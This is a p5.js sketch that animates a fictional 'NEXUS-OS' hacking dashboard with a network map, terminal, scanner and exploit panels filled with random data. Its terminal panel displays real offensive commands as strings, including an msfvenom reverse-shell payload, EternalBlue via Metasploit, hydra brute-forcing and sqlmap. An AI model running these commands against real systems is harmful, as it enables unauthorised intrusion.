
let nodes = [];
let terminalLog = [];
let hops = [];
let scanResults = [];
let exploitStatus = [];
let networkTraffic = [];
let currentTime = 0;
let deltaTime = 0;
let lastTime = 0;

// Coordinated attack system variables
let attackSequence = {
  currentPhase: 0,
  currentTarget: null,
  phaseTimer: 0,
  phaseDuration: 3000, // 3 seconds per phase
  targets: [],
  attackInProgress: false
};

// Attack phases
const PHASES = {
  TARGET_SELECTION: 0,
  TERMINAL_COMMAND: 1,
  NETWORK_HIGHLIGHT: 2,
  VULNERABILITY_SCAN: 3,
  EXPLOIT_EXECUTION: 4,
  COMPLETE: 5
};

function setup() {
  createCanvas(windowWidth, windowHeight);
  textFont("Courier");
  initNodes();
  initHops();
  initScanResults();
  initExploitStatus();
  initNetworkTraffic();
  initAttackSequence();
}

// Calculate responsive text sizes based on window dimensions
function getResponsiveTextSize(baseSize) {
  let scaleFactor = min(width / 1200, height / 800); // Base scale on 1200x800
  return max(baseSize * scaleFactor, baseSize * 0.8); // Minimum 80% of original size
}

function draw() {
  background(0);
  currentTime = millis();
  deltaTime = currentTime - lastTime;
  lastTime = currentTime;
  
  // Update attack sequence
  updateAttackSequence();
  
  // Calculate grid layout - account for status bar height
  let margin = 15;
  let statusBarHeight = 40;
  let availableHeight = height - statusBarHeight - 3 * margin;
  let w = (width - 3 * margin) / 2;
  let h = availableHeight / 2;
  
  // Draw interface sections
  drawNetworkMap(margin, margin, w, h);
  drawTerminal(margin + w + margin, margin, w, h);
  drawVulnerabilityScanner(margin, margin + h + margin, w, h);
  drawExploitFramework(margin + w + margin, margin + h + margin, w, h);
  

  
  // Draw status bar
  drawStatusBar();
}

function drawStatusBar() {
  push();
  fill(0, 50, 0);
  rect(0, height - 40, width, 40);
  fill(0, 255, 0);
  textSize(getResponsiveTextSize(16));
  textAlign(LEFT);
  
  // Show attack status if in progress
  let statusText = "NEXUS-OS v3.2.1 | TARGET: 192.168.1.0/24 | USER: root | SESSION: " + floor(currentTime/1000);
  if (attackSequence.attackInProgress) {
    let phaseNames = ["TARGET_SELECTION", "TERMINAL_COMMAND", "NETWORK_HIGHLIGHT", "VULNERABILITY_SCAN", "EXPLOIT_EXECUTION", "COMPLETE"];
    statusText = "NEXUS-OS v3.2.1 | ATTACK: " + phaseNames[attackSequence.currentPhase] + " | TARGET: " + (attackSequence.currentTarget || "NONE") + " | SESSION: " + floor(currentTime/1000);
  }
  
  text(statusText, 15, height - 15);
  textAlign(RIGHT);
  
  // More realistic system readings with much slower changes
  let cpuUsage = 18 + sin(frameCount * 0.001) * 5 + random(-1, 1); // 18-23% with very slow variation
  let memUsage = 52 + sin(frameCount * 0.0005) * 8 + random(-2, 2); // 52-60% with very slow variation
  let netSpeed = 16 + sin(frameCount * 0.002) * 4 + random(-0.5, 0.5); // 16-20 Mbps with very slow variation
  
  text("CPU: " + floor(cpuUsage) + "% | MEM: " + floor(memUsage) + "% | NET: " + floor(netSpeed) + " Mbps", width - 15, height - 15);
  pop();
}

function initNodes() {
  // We'll initialize with relative positions (0-1) and convert to actual coordinates in drawNetworkMap
  for (let i = 0; i < 15; i++) {
    nodes.push({
      x: random(0.1, 0.9),
      y: random(0.2, 0.8),
      ip: randomIP(),
      os: randomOS(),
      status: randomStatus(),
      ports: generatePorts(),
      lastSeen: floor(random(1, 60))
    });
  }
}

function initHops() {
  for (let i = 0; i < 8; i++) {
    hops.push({
      x: random(50, 200),
      y: random(50, 200),
      ip: randomIP(),
      country: randomCountry(),
      latency: random(10, 200)
    });
  }
}

function initScanResults() {
  let services = ["SSH", "HTTP", "HTTPS", "FTP", "SMTP", "DNS", "RDP", "VNC", "MySQL", "PostgreSQL"];
  for (let i = 0; i < 20; i++) {
    scanResults.push({
      ip: randomIP(),
      port: floor(random(1, 65535)),
      service: random(services),
      version: randomVersion(),
      banner: randomBanner()
    });
  }
}

function initExploitStatus() {
  let exploits = ["CVE-2021-44228", "CVE-2021-34527", "CVE-2020-1472", "CVE-2019-0708", "CVE-2018-7600"];
  for (let i = 0; i < 10; i++) {
    exploitStatus.push({
      exploit: random(exploits),
      target: randomIP(),
      status: random(["PENDING", "RUNNING", "SUCCESS", "FAILED"]),
      progress: random(0, 100)
    });
  }
}

function initNetworkTraffic() {
  for (let i = 0; i < 50; i++) {
    networkTraffic.push({
      src: randomIP(),
      dst: randomIP(),
      protocol: random(["TCP", "UDP", "ICMP"]),
      port: floor(random(1, 65535)),
      size: random(64, 1500),
      timestamp: random(0, currentTime)
    });
  }
}

function initAttackSequence() {
  // Define a sequence of targets for the attack
  attackSequence.targets = [
    "192.168.1.10",
    "192.168.1.20",
    "192.168.1.30",
    "192.168.1.40",
    "192.168.1.50"
  ];
  attackSequence.currentPhase = PHASES.TARGET_SELECTION;
  attackSequence.phaseTimer = 0;
  attackSequence.attackInProgress = true;
}

function restartAttackSequence() {
  attackSequence.currentPhase = PHASES.TARGET_SELECTION;
  attackSequence.phaseTimer = 0;
  attackSequence.attackInProgress = true;
  attackSequence.currentTarget = null;
}

function updateAttackSequence() {
  if (!attackSequence.attackInProgress) return;

  attackSequence.phaseTimer += deltaTime;

  if (attackSequence.phaseTimer >= attackSequence.phaseDuration) {
    attackSequence.phaseTimer = 0;
    attackSequence.currentPhase++;

    if (attackSequence.currentPhase > PHASES.COMPLETE) {
      // Restart the sequence after a brief pause
      setTimeout(() => {
        restartAttackSequence();
      }, 2000);
      return;
    }

    switch (attackSequence.currentPhase) {
      case PHASES.TARGET_SELECTION:
        attackSequence.currentTarget = attackSequence.targets[floor(random(attackSequence.targets.length))];
        console.log("Phase: Target Selection, Target: " + attackSequence.currentTarget);
        break;
      case PHASES.TERMINAL_COMMAND:
        terminalLog.push(generateTerminalCommand());
        if (terminalLog.length > 15) terminalLog.shift();
        console.log("Phase: Terminal Command, Command: " + terminalLog[terminalLog.length - 1]);
        break;
      case PHASES.NETWORK_HIGHLIGHT:
        // Logic to highlight network nodes or traffic
        console.log("Phase: Network Highlight");
        break;
      case PHASES.VULNERABILITY_SCAN:
        // Logic to trigger vulnerability scanning
        console.log("Phase: Vulnerability Scan");
        break;
      case PHASES.EXPLOIT_EXECUTION:
        // Logic to trigger exploit execution
        console.log("Phase: Exploit Execution");
        break;
    }
  }
}

function drawNetworkMap(x, y, w, h) {
  push();
  translate(x, y);
  
  // Background
  fill(0, 20, 0);
  rect(0, 0, w, h);
  stroke(0, 100, 0);
  strokeWeight(1);
  noFill();
  rect(0, 0, w, h);
  
  // Title with better spacing
  fill(0, 255, 0);
  textSize(getResponsiveTextSize(18));
  textAlign(CENTER);
  text("NETWORK TOPOLOGY", w/2, 25);
  textAlign(LEFT);
  
  // Subtitle
  fill(0, 150, 0);
  textSize(getResponsiveTextSize(10));
  textAlign(CENTER);
  text("ACTIVE NODES: " + nodes.length + " | SCAN STATUS: ACTIVE", w/2, 40);
  textAlign(LEFT);
  
  // Network activity indicator - top right
  fill(0, 255, 0);
  textSize(getResponsiveTextSize(10));
  textAlign(RIGHT);
  text("NETWORK STATUS: ONLINE", w - 15, 25);
  textAlign(LEFT);
  
  // Status summary - moved to top left
  let activeCount = nodes.filter(n => n.status === "ACTIVE").length;
  let vulnerableCount = nodes.filter(n => n.status === "VULNERABLE").length;
  let compromisedCount = nodes.filter(n => n.status === "COMPROMISED").length;
  
  fill(0, 255, 0);
  textSize(getResponsiveTextSize(10));
  textAlign(LEFT);
  text("ACTIVE: " + activeCount + " | VULN: " + vulnerableCount + " | COMP: " + compromisedCount, 15, 25);
  
  // Draw nodes
  for (let i = 0; i < nodes.length; i++) {
    let n = nodes[i];
    // Convert relative coordinates to panel coordinates
    let nodeX = n.x * w;
    let nodeY = n.y * h;
    
    // Check if node is within panel bounds (with margin for text)
    let margin = 100;
    if (nodeX < margin || nodeX > w - margin || nodeY < margin || nodeY > h - margin) {
      continue; // Skip nodes outside the panel
    }
    
    let nodeColor = n.status === "ACTIVE" ? color(0, 255, 0) : 
                n.status === "VULNERABLE" ? color(255, 165, 0) : 
                color(255, 0, 0);
    
    // Highlight current target during attack sequence
    if (attackSequence.attackInProgress && attackSequence.currentTarget && n.ip === attackSequence.currentTarget) {
      if (attackSequence.currentPhase >= PHASES.TARGET_SELECTION) {
        // Target acquisition effect
        let acquisitionProgress = (attackSequence.phaseTimer / attackSequence.phaseDuration);
        let pulseSize = 6 + sin(frameCount * 0.1) * 4;
        
        if (attackSequence.currentPhase === PHASES.TARGET_SELECTION) {
          // Scanning effect
          fill(255, 255, 0, 150);
          ellipse(nodeX, nodeY, pulseSize * 2, pulseSize * 2);
          fill(255, 255, 0);
          ellipse(nodeX, nodeY, pulseSize, pulseSize);
        } else if (attackSequence.currentPhase >= PHASES.NETWORK_HIGHLIGHT) {
          // Locked target effect
          fill(255, 0, 0);
          ellipse(nodeX, nodeY, pulseSize, pulseSize);
          
          // Draw attack indicator
          fill(255, 0, 0);
          textSize(getResponsiveTextSize(10));
          textAlign(CENTER);
          text("TARGET", nodeX, nodeY - 20);
          textAlign(LEFT);
          
          // Draw crosshair effect
          stroke(255, 0, 0);
          strokeWeight(1);
          line(nodeX - 15, nodeY, nodeX + 15, nodeY);
          line(nodeX, nodeY - 15, nodeX, nodeY + 15);
          noStroke();
        }
      }
    }
    
    fill(nodeColor);
    noStroke();
    ellipse(nodeX, nodeY, 6, 6);
    
    // Draw connections (only if both nodes are within bounds)
    stroke(0, 100, 0);
    strokeWeight(1);
    for (let j = 0; j < 3; j++) {
      let target = nodes[(i + j + 1) % nodes.length];
      let targetX = target.x * w;
      let targetY = target.y * h;
      
      // Only draw connection if target is also within bounds
      if (targetX >= margin && targetX <= w - margin && targetY >= margin && targetY <= h - margin) {
        line(nodeX, nodeY, targetX, targetY);
      }
    }
    
    // Node info with better layout
    fill(0, 255, 0);
    textSize(getResponsiveTextSize(10));
    textAlign(LEFT);
    text(n.ip, nodeX + 12, nodeY - 4);
    
    fill(0, 200, 0);
    textSize(getResponsiveTextSize(8));
    text(n.os, nodeX + 12, nodeY + 8);
  }
  

  
  // Attack sequence progress indicator - moved to bottom left
  if (attackSequence.attackInProgress) {
    let phaseProgress = (attackSequence.phaseTimer / attackSequence.phaseDuration) * 100;
    let phaseNames = ["TARGET_SELECTION", "TERMINAL_COMMAND", "NETWORK_HIGHLIGHT", "VULNERABILITY_SCAN", "EXPLOIT_EXECUTION"];
    
    // Attack status indicator - moved underneath network status
    fill(255, 0, 0);
    textSize(getResponsiveTextSize(10));
    textAlign(RIGHT);
    text("ATTACK IN PROGRESS", w - 15, 40);
    textAlign(LEFT);
    
    // Phase indicator - bottom left
    fill(255, 255, 0);
    textSize(getResponsiveTextSize(10));
    textAlign(LEFT);
    text("PHASE: " + phaseNames[attackSequence.currentPhase], 15, h - 25);
    
    // Progress bar - bottom left
    fill(0, 50, 0);
    rect(15, h - 15, 200, 6);
    fill(255, 255, 0);
    rect(15, h - 15, 200 * phaseProgress / 100, 6);
    
    // Progress percentage
    fill(255, 255, 0);
    textSize(getResponsiveTextSize(8));
    text(floor(phaseProgress) + "%", 220, h - 10);
    
    // Target information panel - bottom center
    if (attackSequence.currentTarget) {
      fill(0, 20, 0);
      stroke(255, 0, 0);
      strokeWeight(1);
      rect(w/2 - 120, h - 60, 240, 50);
      
      fill(255, 0, 0);
      textSize(getResponsiveTextSize(10));
      textAlign(CENTER);
      text("CURRENT TARGET", w/2, h - 45);
      
      fill(255, 255, 0);
      textSize(getResponsiveTextSize(12));
      text(attackSequence.currentTarget, w/2, h - 30);
      
      // Find target node info
      let targetNode = nodes.find(n => n.ip === attackSequence.currentTarget);
      if (targetNode) {
        fill(0, 255, 0);
        textSize(getResponsiveTextSize(8));
        text(targetNode.os + " | " + targetNode.status, w/2, h - 15);
      }
      textAlign(LEFT);
    }
  }
  
  pop();
}



function drawTerminal(x, y, w, h) {
  push();
  translate(x, y);
  
  // Background
  fill(0, 20, 0);
  rect(0, 0, w, h);
  stroke(0, 100, 0);
  strokeWeight(1);
  noFill();
  rect(0, 0, w, h);
  
  // Title with better spacing
  fill(0, 255, 0);
  textSize(getResponsiveTextSize(18));
  textAlign(CENTER);
  text("TERMINAL SESSION", w/2, 30);
  textAlign(LEFT);
  
  // Session info
  fill(0, 150, 0);
  textSize(getResponsiveTextSize(10));
  textAlign(CENTER);
  text("SESSION: " + floor(currentTime/1000) + "s | COMMANDS: " + terminalLog.length, w/2, 45);
  textAlign(LEFT);
  
  // Terminal content
  fill(0, 255, 0);
  textSize(getResponsiveTextSize(12));
  let startY = 75;
  let lineHeight = 18;
  
  // Add realistic terminal output
  if (frameCount % 30 === 0 && !attackSequence.attackInProgress) {
    terminalLog.push(generateTerminalCommand());
    if (terminalLog.length > 15) terminalLog.shift();
  }
  
  // Show attack sequence commands
  if (attackSequence.attackInProgress && attackSequence.currentPhase === PHASES.TERMINAL_COMMAND) {
    let attackCommands = [
      "nmap -sS -p- " + attackSequence.currentTarget,
      "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe",
      "metasploit > use exploit/windows/smb/ms17_010_eternalblue",
      "metasploit > set RHOSTS " + attackSequence.currentTarget,
      "metasploit > exploit",
      "hydra -l admin -P wordlist.txt ssh://" + attackSequence.currentTarget,
      "sqlmap -u http://" + attackSequence.currentTarget + "/login.php --dbs"
    ];
    
    if (terminalLog.length === 0 || !terminalLog[terminalLog.length - 1].includes(attackSequence.currentTarget)) {
      terminalLog.push("root@nexus:~# " + random(attackCommands));
      if (terminalLog.length > 15) terminalLog.shift();
    }
  }
  
  for (let i = 0; i < terminalLog.length; i++) {
    text(terminalLog[i], 10, startY + i * lineHeight);
  }
  
  // Cursor
  if (frameCount % 60 < 30) {
    fill(0, 255, 0);
    text("█", 10 + textWidth(terminalLog[terminalLog.length - 1] || ""), startY + (terminalLog.length - 1) * lineHeight);
  }
  
  pop();
}

function drawVulnerabilityScanner(x, y, w, h) {
  push();
  translate(x, y);
  
  // Background
  fill(0, 20, 0);
  rect(0, 0, w, h);
  stroke(0, 100, 0);
  strokeWeight(1);
  noFill();
  rect(0, 0, w, h);
  
  // Title with better spacing
  fill(0, 255, 0);
  textSize(getResponsiveTextSize(18));
  textAlign(CENTER);
  text("VULNERABILITY SCANNER", w/2, 30);
  textAlign(LEFT);
  
  // Scanner status
  fill(0, 150, 0);
  textSize(getResponsiveTextSize(10));
  textAlign(CENTER);
  text("SCAN RANGE: 1-1024 | PROTOCOLS: TCP/UDP", w/2, 45);
  textAlign(LEFT);
  
  // Scan results
  fill(0, 255, 0);
  textSize(getResponsiveTextSize(11));
  let startY = 75;
  let lineHeight = 16;
  
  for (let i = 0; i < min(8, scanResults.length); i++) {
    let result = scanResults[i];
    let yPos = startY + i * lineHeight;
    
    // Fixed column widths with proper spacing
    let col1X = 15;    // IP:Port column
    let col2X = 180;   // Service column (more space)
    let col3X = 320;   // Banner column (more space)
    
    // IP and port with fixed width
    fill(0, 255, 0);
    textAlign(LEFT);
    let ipPort = result.ip + ":" + result.port;
    text(ipPort, col1X, yPos);
    
    // Service and version with proper spacing
    fill(255, 165, 0);
    text(result.service, col2X, yPos);
    
    fill(0, 255, 0);
    text(result.version, col2X + textWidth(result.service) + 8, yPos);
    
    // Banner with truncation and fixed width
    fill(100, 100, 100);
    let banner = result.banner.length > 20 ? result.banner.substring(0, 20) + "..." : result.banner;
    text(banner, col3X, yPos);
  }
  
  // Current scan target
  let scanProgress = (frameCount / 10) % 100;
  let currentTarget = "192.168.1." + floor((frameCount / 10) % 255);
  let currentPort = floor(random(1, 65535));
  
  // Show coordinated scanning during attack sequence
  if (attackSequence.attackInProgress && attackSequence.currentPhase === PHASES.VULNERABILITY_SCAN && attackSequence.currentTarget) {
    currentTarget = attackSequence.currentTarget;
    scanProgress = (attackSequence.phaseTimer / attackSequence.phaseDuration) * 100;
    
    // Add scan results for current target
    if (frameCount % 15 === 0) {
      let newResult = {
        ip: currentTarget,
        port: floor(random(1, 65535)),
        service: random(["SSH", "HTTP", "HTTPS", "FTP", "SMTP", "DNS", "RDP", "VNC", "MySQL", "PostgreSQL"]),
        version: randomVersion(),
        banner: randomBanner()
      };
      scanResults.unshift(newResult);
      if (scanResults.length > 20) scanResults.pop();
    }
  }
  
  // Status and current target with better layout
  fill(0, 255, 0);
  textSize(getResponsiveTextSize(12));
  textAlign(LEFT);
  
  // Progress info
  text("SCANNING: " + floor(scanProgress) + "% | TARGET: " + currentTarget + ":" + currentPort, 15, h - 55);
  text("FOUND: " + scanResults.length + " SERVICES | PORTS: 1-1024", 15, h - 35);
  
  // Progress bar below the text
  fill(0, 50, 0);
  rect(15, h - 25, w - 30, 12);
  fill(0, 255, 0);
  rect(15, h - 25, (w - 30) * scanProgress / 100, 12);
  
  pop();
}

function drawExploitFramework(x, y, w, h) {
  push();
  translate(x, y);
  
  // Background
  fill(0, 20, 0);
  rect(0, 0, w, h);
  stroke(0, 100, 0);
  strokeWeight(1);
  noFill();
  rect(0, 0, w, h);
  
  // Title with better spacing
  fill(0, 255, 0);
  textSize(getResponsiveTextSize(18));
  textAlign(CENTER);
  text("EXPLOIT FRAMEWORK", w/2, 30);
  textAlign(LEFT);
  
  // Framework status
  fill(0, 150, 0);
  textSize(getResponsiveTextSize(10));
  textAlign(CENTER);
  text("EXPLOITS: " + exploitStatus.length + " | ACTIVE: " + exploitStatus.filter(e => e.status === "RUNNING").length, w/2, 45);
  textAlign(LEFT);
  
  // Exploit status
  fill(0, 255, 0);
  textSize(getResponsiveTextSize(11));
  let startY = 75;
  let lineHeight = 18;
  
  // Show coordinated exploitation during attack sequence
  if (attackSequence.attackInProgress && attackSequence.currentPhase === PHASES.EXPLOIT_EXECUTION && attackSequence.currentTarget) {
    // Add new exploit for current target
    if (frameCount % 30 === 0) {
      let newExploit = {
        exploit: random(["CVE-2021-44228", "CVE-2021-34527", "CVE-2020-1472", "CVE-2019-0708", "CVE-2018-7600"]),
        target: attackSequence.currentTarget,
        status: "RUNNING",
        progress: (attackSequence.phaseTimer / attackSequence.phaseDuration) * 100
      };
      exploitStatus.unshift(newExploit);
      if (exploitStatus.length > 10) exploitStatus.pop();
    }
  }
  
  for (let i = 0; i < min(8, exploitStatus.length); i++) {
    let exploit = exploitStatus[i];
    let yPos = startY + i * lineHeight;
    
    // Fixed column widths with proper spacing
    let col1X = 15;    // Exploit name column
    let col2X = 200;   // Target column (more space)
    let col3X = 320;   // Status column (more space)
    let col4X = 420;   // Progress bar column
    
    // Exploit name with fixed width
    fill(0, 255, 0);
    textAlign(LEFT);
    text(exploit.exploit, col1X, yPos);
    
    // Target with fixed width
    fill(255, 165, 0);
    text(exploit.target, col2X, yPos);
    
    // Status with better alignment
    let statusColor = exploit.status === "SUCCESS" ? color(0, 255, 0) :
                     exploit.status === "RUNNING" ? color(255, 165, 0) :
                     exploit.status === "FAILED" ? color(255, 0, 0) : color(100, 100, 100);
    fill(statusColor);
    text(exploit.status, col3X, yPos);
    
    // Progress bar with better positioning
    if (exploit.status === "RUNNING") {
      fill(0, 50, 0);
      rect(col4X, yPos - 8, 60, 8);
      fill(0, 255, 0);
      rect(col4X, yPos - 8, 60 * exploit.progress / 100, 8);
    }
  }
  
  // Summary with better layout
  fill(0, 255, 0);
  textSize(getResponsiveTextSize(12));
  textAlign(LEFT);
  
  // Summary header
  text("EXPLOIT SUMMARY:", 15, h - 70);
  
  // Summary details with color coding
  let runningCount = exploitStatus.filter(e => e.status === "RUNNING").length;
  let successCount = exploitStatus.filter(e => e.status === "SUCCESS").length;
  let failedCount = exploitStatus.filter(e => e.status === "FAILED").length;
  
  fill(255, 165, 0);
  text("• RUNNING: " + runningCount, 25, h - 50);
  fill(0, 255, 0);
  text("• SUCCESS: " + successCount, 25, h - 35);
  fill(255, 0, 0);
  text("• FAILED: " + failedCount, 25, h - 20);
  
  pop();
}

// Helper functions for generating realistic data
function randomIP() {
  return floor(random(1, 255)) + "." + floor(random(0, 255)) + "." + floor(random(0, 255)) + "." + floor(random(1, 255));
}

function randomOS() {
  let os = ["Linux 4.19", "Windows 10", "Ubuntu 20.04", "CentOS 7", "Debian 11", "FreeBSD 13"];
  return random(os);
}

function randomStatus() {
  let status = ["ACTIVE", "VULNERABLE", "COMPROMISED", "ACTIVE", "ACTIVE"];
  return random(status);
}

function generatePorts() {
  let ports = [];
  for (let i = 0; i < random(1, 5); i++) {
    ports.push(floor(random(1, 65535)));
  }
  return ports;
}

function randomCountry() {
  let countries = ["US", "CN", "RU", "DE", "JP", "GB", "FR", "CA"];
  return random(countries);
}

function randomVersion() {
  let versions = ["1.2.3", "2.1.0", "3.0.1", "1.0.0", "4.2.1", "2.3.4"];
  return random(versions);
}

function randomBanner() {
  let banners = ["SSH-2.0-OpenSSH_8.2p1", "HTTP/1.1 200 OK", "220 smtp.example.com", "MySQL 5.7.33"];
  return random(banners);
}

function generateTerminalCommand() {
  let commands = [
    "nmap -sS -p- 192.168.1.0/24",
    "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe",
    "sqlmap -u http://target.com/login.php --dbs",
    "hydra -l admin -P wordlist.txt ssh://192.168.1.1",
    "aircrack-ng capture.cap -w wordlist.txt",
    "metasploit > use exploit/windows/smb/ms17_010_eternalblue",
    "wireshark -i eth0 -k",
    "john --wordlist=rockyou.txt hash.txt",
    "dirb http://target.com /usr/share/dirb/wordlists/common.txt",
    "nikto -h http://target.com"
  ];
  return "root@nexus:~# " + random(commands);
}
